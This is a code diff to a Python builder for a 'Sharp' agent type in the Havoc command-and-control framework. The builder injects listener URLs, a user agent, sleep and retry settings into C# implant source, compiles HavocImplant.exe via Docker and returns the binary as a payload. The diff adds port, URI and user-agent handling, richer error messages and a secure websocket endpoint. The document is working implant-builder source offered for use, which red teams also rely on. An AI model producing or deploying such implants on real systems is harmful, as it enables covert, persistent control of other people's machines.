@@ -1,4 +1,5 @@
 
+import traceback
 from havoc.service import HavocService
 from havoc.agent import *
 import os, re
@@ -308,7 +309,7 @@ class CommandPowershell(Command):
         return packer.buffer[:-1]
 
 class Sharp(AgentType):
-    Name = "Sharp"
+    Name = "C# from Kali"
     Author = "@smallbraintranman"
     Version = "0.1"
     Description = f"""Test Description version: {Version}. I like C# a little too much."""
@@ -382,16 +383,25 @@ class Sharp(AgentType):
             urls = []
             self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent secure: {config['Options']['Listener'].get('Secure')}" )
             if config['Options']['Listener'].get("Secure") == False:
-                urlBase = "http://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")
+                urlBase = "http://"+config['Options']['Listener'].get("Hosts")[0]
             else:
-                urlBase = "https://"+config['Options']['Listener'].get("Hosts")[0]+":"+config['Options']['Listener'].get("Port")
+                urlBase = "https://"+config['Options']['Listener'].get("Hosts")[0]
+            if 'Port' in config['Options']['Listener']:
+                urlBase += f":{config['Options']['Listener']['Port']}"
 
-            for endpoint in config['Options']['Listener'].get("Uris"):
-                if endpoint[0] != '/': #check if the uri starts with /
-                    urls.append(urlBase+'/'+endpoint)
-                else:
-                    urls.append(urlBase+endpoint)
+            if config['Options']['Listener'].get("Uris") is None:
+                urls.append(urlBase+'/')
+            else:
+                for endpoint in config['Options']['Listener'].get("Uris"):
+                    if endpoint.startswith('/'):
+                        urls.append(urlBase+endpoint)
+                    else:
+                        urls.append(urlBase+'/'+endpoint)
             self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent URLs: {urls}" )
+
+            # Get userAgent for agent
+            userAgent = config['Options']['Listener']['UserAgent']
+            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent UserAgent: {userAgent}" )
 
             # Getting Sleep time for agent
             sleep = int(config['Config'].get('Sleep')) * 1000
@@ -404,9 +414,10 @@ class Sharp(AgentType):
             #Get checkin max failed attempts
             maxTries = int(config['Config'].get('Maximum Timeouts'))
             self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Max Timeouts: {maxTries}" )
-            old_strings = ['url', 'sleepTime', 'timeout', 'maxTries']
+            old_strings = ['url', 'userAgent', 'sleepTime', 'timeout', 'maxTries']
             new_strings = [
                 "url = new string[] {{ {} }};".format(str(urls).strip('[').strip(']').replace("'", "\"")), 
+                "userAgent = \"{}\";".format(userAgent),
                 "sleepTime = {};".format(sleep),
                 "timeout = {};".format(timeout),
                 "maxTries = {};".format(maxTries),
@@ -422,15 +433,17 @@ class Sharp(AgentType):
                     s = (re.sub(fr"{old_strings[i]}.*;", new_strings[i], s))
                 f.write(s)
             #Payload time
-            os.system("docker-compose up")
+            os.system("docker compose up")
             in_file = open("AgentCode/bin/x64/Release/HavocImplant.exe", "rb") # opening for [r]eading as [b]inary
             data = in_file.read() # if you only wanted to read 512 bytes, do .read(512)
             in_file.close()
-            os.system("rm AgentCode/bin/x64/Release/HavocImplant.exe")
+            os.system("rm -f AgentCode/bin/x64/Release/HavocImplant.exe")
             self.builder_send_payload( config[ 'ClientID' ], self.Name + ".exe", data )
         
-        except:
+        except Exception as e:
             self.builder_send_message( config[ 'ClientID' ], "Error", "There was a build error, returning an empty blob so handler doesn't bork" )
+            self.builder_send_message( config[ 'ClientID' ], "Error", traceback.format_exc())
+            self.builder_send_message( config[ 'ClientID' ], "Error", str(e))
             self.builder_send_payload( config[ 'ClientID' ], "THIS SHIT ERRORED", b'bruh' )
     
     def command_not_found(self, response: dict) -> dict:
@@ -452,7 +465,6 @@ class Sharp(AgentType):
         }
     
     def response( self, response: dict ) -> bytes:
-        agent_header    = response[ "AgentHeader" ]
         agent_header    = response[ "AgentHeader" ]
         agent_response  = base64.b64decode( response[ "Response" ] ) # the teamserver base64 encodes the request.
 
@@ -483,8 +495,9 @@ class Sharp(AgentType):
 
 def main():
     Havoc_Sharp = Sharp()
+    ip = '127.0.0.1'
     Havoc_Service = HavocService(
-        endpoint="ws://localhost:40056/service-endpoint",
+        endpoint=f"wss://{ip}:40056/service-endpoint",
         password="service-password"
     )
 
